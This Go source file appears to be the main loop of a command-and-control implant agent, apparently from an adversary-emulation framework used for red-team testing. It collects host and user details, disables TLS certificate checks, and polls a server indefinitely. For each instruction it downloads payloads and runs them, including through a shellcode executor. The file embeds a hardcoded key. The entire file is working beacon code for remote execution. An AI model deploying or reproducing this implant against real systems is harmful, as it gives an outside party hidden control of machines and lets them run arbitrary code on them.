package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/user"
	"reflect"
	"runtime"
	"time"

	"strconv"

	"./api"
	"./execute"
	"./shellcode"
	"./util"
)

var iteration = 10

func askForInstructions(profile map[string]interface{}) {
	commands := api.Instructions(profile)
	if commands != nil && len(commands.([]interface{})) > 0 {
		cmds := reflect.ValueOf(commands)
		for i := 0; i < cmds.Len(); i++ {
			cmd := cmds.Index(i).Elem().String()
			fmt.Println("[*] Running instruction")
			command := util.Unpack([]byte(cmd))
			api.Drop(profile["server"].(string), command["payload"].(string))
			api.Execute(profile, command)
		}
	} else {
		time.Sleep(time.Duration(iteration) * time.Second)
	}
}

func buildProfile(server string, group string, executor string) map[string]interface{} {
	host, _ := os.Hostname()
	user, _ := user.Current()
	paw := fmt.Sprintf("%s$%s", host, user.Username)
	arch := runtime.GOARCH
	profile := make(map[string]interface{})
	profile["paw"] = paw
	profile["server"] = server
	profile["group"] = group
	profile["architecture"] = arch
	profile["platform"] = runtime.GOOS
	profile["location"] = os.Args[0]
	profile["pid"] = strconv.Itoa(os.Getpid())
	profile["ppid"] = strconv.Itoa(os.Getppid())
	profile["executors"] = getExecutors(executor, arch)
	return profile
}

func getExecutors(executor string, arch string) []string {
	executors := []string{executor}
	if shellcode.IsAvailable() {
		executors = append(executors, "shellcode_"+arch)
	}
	return executors
}

func main() {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	server := flag.String("server", "http://localhost:8888", "The FQDN of the server")
	group := flag.String("group", "my_group", "Attach a group to this agent")
	executor := flag.String("executor", execute.DetermineExecutor(runtime.GOOS), "Select a primary executor")
	flag.Parse()
	profile := buildProfile(*server, *group, *executor)
	for {
		askForInstructions(profile)
	}
}

var key = "3TEU4UD15V29OBJB7U9HNCR2JPWL1U"
